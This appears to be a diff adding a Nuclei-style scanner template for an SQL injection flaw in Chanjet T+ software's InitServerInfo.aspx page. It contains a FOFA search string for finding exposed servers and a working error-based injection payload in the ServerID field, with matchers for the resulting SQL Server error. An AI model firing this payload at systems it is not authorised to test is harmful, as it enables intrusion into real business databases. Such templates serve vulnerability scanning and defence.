@@ -1,0 +1,30 @@
+id: poc-yaml-changjie-tplus-initservreinfo-sqli
+info:
+  name: 畅捷通T+ InitServerInfo.aspx SQL漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 畅捷通T+
+    fofa: app="畅捷通-TPlus"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/tplus/UFAQD/InitServerInfo.aspx?preload=1"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))%2b'1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "{{t2}}"
+          - "转换成数据类型 int 时失败"
